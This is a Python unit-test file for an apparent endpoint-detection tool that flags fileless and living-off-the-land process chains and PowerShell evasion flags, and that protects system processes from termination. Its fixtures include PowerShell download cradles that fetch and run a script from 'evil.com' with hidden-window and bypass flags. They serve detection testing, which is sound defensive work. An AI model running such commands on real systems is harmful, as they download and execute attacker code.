"""
FixAI EDR — Phase 3 Unit Tests: Fileless Threat Hunter & LotL Process Tree Monitor
====================================================================================

Tests cover:
1. WMI Persistence Detection (scrcons.exe -> powershell.exe) — CRITICAL
2. WMI Provider Host LotL (wmiprvse.exe -> cmd.exe) — HIGH/MEDIUM
3. LotL Proxy Execution (mshta.exe -> powershell.exe) — HIGH
4. Benign Process Lineage (explorer.exe -> cmd.exe) — No alert
5. Command-Line Evasion Pattern Analysis (-enc, -w hidden, -ep bypass, IEX cradles)
6. OS Protected Process Safety Whitelist (prevents terminating system processes)
7. Alert Deduplication Cache (same PID should not generate duplicate alerts)
8. Callback Dispatch Verification
"""

import sys
import os
import unittest

# Ensure the parent directory is importable
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from security.threat_hunter import (
    ThreatHunter,
    FilelessThreatAlert,
    PROTECTED_PROCESS_NAMES,
    PROTECTED_SYSTEM_PIDS,
    SUSPICIOUS_PARENTS,
    SUSPICIOUS_CHILDREN,
)


class TestPhase3ThreatHunter(unittest.TestCase):
    """Phase 3: Fileless Threat Hunting & LotL Process Tree Tests"""

    def setUp(self):
        self.alerts_received = []
        self.hunter = ThreatHunter(
            callback=lambda alert: self.alerts_received.append(alert),
            check_wmi_subscriptions=False,
        )

    # ====================================================================
    # Test 1: WMI Persistence — scrcons.exe -> powershell.exe (CRITICAL)
    # ====================================================================
    def test_wmi_persistence_scrcons_powershell(self):
        """scrcons.exe spawning powershell.exe is the classic fileless WMI persistence indicator."""
        snapshot = [
            {"pid": 1000, "ppid": 4, "name": "scrcons.exe", "cmdline": "C:\\Windows\\System32\\scrcons.exe"},
            {"pid": 2000, "ppid": 1000, "name": "powershell.exe",
             "cmdline": "powershell.exe -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBu -w hidden"},
        ]
        alerts = self.hunter.scan_processes(process_snapshot=snapshot)

        self.assertEqual(len(alerts), 1)
        alert = alerts[0]
        self.assertEqual(alert.alert_type, "WMI_PERSISTENCE")
        self.assertEqual(alert.severity, "CRITICAL")
        self.assertEqual(alert.parent_name, "scrcons.exe")
        self.assertEqual(alert.child_name, "powershell.exe")
        self.assertEqual(alert.child_pid, 2000)
        self.assertIn("T1546.003", alert.mitre_technique)
        self.assertGreaterEqual(alert.details["risk_score"], 90)
        self.assertTrue(alert.details["parent_is_wmi_consumer"])
        # Callback should also have fired
        self.assertEqual(len(self.alerts_received), 1)

    # ====================================================================
    # Test 2: WMI Provider Host — wmiprvse.exe -> cmd.exe (MEDIUM/HIGH)
    # ====================================================================
    def test_lotl_wmiprvse_cmd(self):
        """wmiprvse.exe spawning cmd.exe without evasion flags is MEDIUM severity."""
        snapshot = [
            {"pid": 500, "ppid": 4, "name": "wmiprvse.exe", "cmdline": "wmiprvse.exe -Embedding"},
            {"pid": 600, "ppid": 500, "name": "cmd.exe", "cmdline": "cmd.exe /c whoami"},
        ]
        alerts = self.hunter.scan_processes(process_snapshot=snapshot)

        self.assertEqual(len(alerts), 1)
        alert = alerts[0]
        self.assertEqual(alert.alert_type, "LOTL_EXECUTION")
        # No evasion indicators -> MEDIUM
        self.assertEqual(alert.severity, "MEDIUM")
        self.assertIn("T1047", alert.mitre_technique)

    def test_lotl_wmiprvse_powershell_with_evasion(self):
        """wmiprvse.exe spawning powershell.exe with -enc flag elevates to HIGH severity."""
        snapshot = [
            {"pid": 500, "ppid": 4, "name": "wmiprvse.exe", "cmdline": "wmiprvse.exe -Embedding"},
            {"pid": 700, "ppid": 500, "name": "powershell.exe",
             "cmdline": "powershell.exe -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBu"},
        ]
        alerts = self.hunter.scan_processes(process_snapshot=snapshot)

        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].severity, "HIGH")
        self.assertTrue(len(alerts[0].details["command_evasion_indicators"]) > 0)

    # ====================================================================
    # Test 3: LotL Proxy Parent — mshta.exe -> powershell.exe (HIGH)
    # ====================================================================
    def test_lotl_mshta_powershell(self):
        """mshta.exe spawning powershell.exe indicates proxy execution (Squiblydoo/HTA attack)."""
        snapshot = [
            {"pid": 800, "ppid": 4, "name": "mshta.exe", "cmdline": "mshta.exe vbscript:close"},
            {"pid": 900, "ppid": 800, "name": "powershell.exe",
             "cmdline": "powershell.exe -nop -w hidden -ep bypass IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"},
        ]
        alerts = self.hunter.scan_processes(process_snapshot=snapshot)

        self.assertEqual(len(alerts), 1)
        alert = alerts[0]
        self.assertEqual(alert.alert_type, "LOTL_EXECUTION")
        self.assertEqual(alert.severity, "HIGH")
        self.assertIn("T1218", alert.mitre_technique)
        # Should detect multiple evasion indicators
        self.assertTrue(len(alert.details["command_evasion_indicators"]) >= 2)

    # ====================================================================
    # Test 4: Benign Process Lineage — explorer.exe -> cmd.exe (NO ALERT)
    # ====================================================================
    def test_benign_explorer_cmd_no_alert(self):
        """explorer.exe spawning cmd.exe is normal user behavior — no alert should fire."""
        snapshot = [
            {"pid": 100, "ppid": 4, "name": "explorer.exe", "cmdline": "explorer.exe"},
            {"pid": 200, "ppid": 100, "name": "cmd.exe", "cmdline": "cmd.exe"},
            {"pid": 300, "ppid": 100, "name": "notepad.exe", "cmdline": "notepad.exe C:\\notes.txt"},
        ]
        alerts = self.hunter.scan_processes(process_snapshot=snapshot)

        self.assertEqual(len(alerts), 0)
        self.assertEqual(len(self.alerts_received), 0)

    # ====================================================================
    # Test 5: Command-Line Evasion Pattern Analysis
    # ====================================================================
    def test_cmdline_evasion_encoded_command(self):
        """Detects -enc / -encodedcommand with Base64 payload."""
        findings = self.hunter.analyze_command_line(
            "powershell.exe -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBu"
        )
        self.assertTrue(len(findings) > 0)

    def test_cmdline_evasion_hidden_window(self):
        """Detects -w hidden (stealth execution)."""
        findings = self.hunter.analyze_command_line("powershell.exe -w hidden -nop -ep bypass")
        self.assertTrue(len(findings) >= 3)  # -w hidden, -nop, -ep bypass

    def test_cmdline_evasion_download_cradle(self):
        """Detects IEX / DownloadString download cradle."""
        findings = self.hunter.analyze_command_line(
            "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')"
        )
        self.assertTrue(len(findings) >= 1)

    def test_cmdline_clean_no_evasion(self):
        """Normal command line should produce zero evasion matches."""
        findings = self.hunter.analyze_command_line("cmd.exe /c dir C:\\Users")
        self.assertEqual(len(findings), 0)

    # ====================================================================
    # Test 6: OS Protected Process Safety Whitelist
    # ====================================================================
    def test_protected_process_pid_0(self):
        """PID 0 (System Idle Process) must always be protected."""
        self.assertTrue(ThreatHunter.is_protected_process(0))

    def test_protected_process_pid_4(self):
        """PID 4 (System) must always be protected."""
        self.assertTrue(ThreatHunter.is_protected_process(4))

    def test_protected_process_by_name_lsass(self):
        """lsass.exe must always be protected regardless of PID."""
        self.assertTrue(ThreatHunter.is_protected_process(99999, name="lsass.exe"))

    def test_protected_process_by_name_csrss(self):
        """csrss.exe must always be protected."""
        self.assertTrue(ThreatHunter.is_protected_process(88888, name="csrss.exe"))

    def test_protected_process_by_name_explorer(self):
        """explorer.exe must always be protected."""
        self.assertTrue(ThreatHunter.is_protected_process(77777, name="explorer.exe"))

    def test_unprotected_process(self):
        """A non-system process with a custom name should NOT be protected."""
        self.assertFalse(ThreatHunter.is_protected_process(50000, name="malware_dropper.exe"))

    def test_suspend_protected_raises(self):
        """Attempting to suspend a protected process must raise PermissionError."""
        with self.assertRaises(PermissionError):
            self.hunter.suspend_process(4)

    def test_terminate_protected_raises(self):
        """Attempting to terminate a protected process must raise PermissionError."""
        with self.assertRaises(PermissionError):
            self.hunter.terminate_process(0)

    # ====================================================================
    # Test 7: Alert Deduplication Cache
    # ====================================================================
    def test_deduplication_same_pid(self):
        """Scanning the same snapshot twice should not produce duplicate alerts."""
        snapshot = [
            {"pid": 1000, "ppid": 4, "name": "scrcons.exe", "cmdline": "scrcons.exe"},
            {"pid": 2000, "ppid": 1000, "name": "cmd.exe", "cmdline": "cmd.exe /c whoami"},
        ]
        alerts_first = self.hunter.scan_processes(process_snapshot=snapshot)
        alerts_second = self.hunter.scan_processes(process_snapshot=snapshot)

        self.assertEqual(len(alerts_first), 1)
        self.assertEqual(len(alerts_second), 0, "Duplicate alert should be suppressed by cache")

    # ====================================================================
    # Test 8: FilelessThreatAlert Data Model Serialization
    # ====================================================================
    def test_alert_to_dict(self):
        """FilelessThreatAlert.to_dict() should produce a complete serializable dictionary."""
        snapshot = [
            {"pid": 3000, "ppid": 4, "name": "scrcons.exe", "cmdline": "scrcons.exe"},
            {"pid": 4000, "ppid": 3000, "name": "powershell.exe", "cmdline": "powershell.exe -nop"},
        ]
        alerts = self.hunter.scan_processes(process_snapshot=snapshot)
        self.assertEqual(len(alerts), 1)

        d = alerts[0].to_dict()
        self.assertIn("alert_id", d)
        self.assertIn("timestamp", d)
        self.assertIn("alert_type", d)
        self.assertIn("severity", d)
        self.assertIn("parent_name", d)
        self.assertIn("child_name", d)
        self.assertIn("mitre_technique", d)
        self.assertIn("details", d)
        self.assertIsInstance(d["details"], dict)

    # ====================================================================
    # Test 9: Multiple Suspicious Children Under One Parent
    # ====================================================================
    def test_multiple_children_same_parent(self):
        """scrcons.exe spawning both powershell.exe AND cmd.exe should produce 2 alerts."""
        snapshot = [
            {"pid": 5000, "ppid": 4, "name": "scrcons.exe", "cmdline": "scrcons.exe"},
            {"pid": 5001, "ppid": 5000, "name": "powershell.exe", "cmdline": "powershell.exe"},
            {"pid": 5002, "ppid": 5000, "name": "cmd.exe", "cmdline": "cmd.exe /c net user"},
        ]
        alerts = self.hunter.scan_processes(process_snapshot=snapshot)

        self.assertEqual(len(alerts), 2)
        alert_types = {a.child_name for a in alerts}
        self.assertIn("powershell.exe", alert_types)
        self.assertIn("cmd.exe", alert_types)
        for a in alerts:
            self.assertEqual(a.severity, "CRITICAL")


if __name__ == "__main__":
    unittest.main(verbosity=2)
